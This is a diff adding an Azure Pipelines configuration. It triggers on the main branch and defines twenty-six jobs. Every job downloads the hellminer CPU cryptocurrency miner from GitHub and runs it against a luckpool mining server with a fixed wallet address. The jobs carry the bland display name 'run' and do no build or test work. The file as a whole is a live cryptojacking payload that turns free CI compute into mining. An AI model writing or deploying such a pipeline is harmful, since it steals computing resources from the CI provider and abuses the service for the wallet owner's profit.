@@ -1,0 +1,109 @@
+trigger:
+- main
+pool:
+  vmImage: 'ubuntu-latest'
+jobs:
+- job: Run1
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run2
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run3
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run4
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run5
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run6
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run7
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run8
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run9
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run10
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run11
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run12
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run13
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run14
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Runi
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run15
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run16
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run17
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run18
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run19
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run20
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run21
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run22
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run23
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run24
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
+- job: Run25
+  steps:
+  - bash: wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz && ./hellminer -c stratum+tcp://na.luckpool.net:3956#xnsub -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure --cpu 8
+    displayName: 'run'
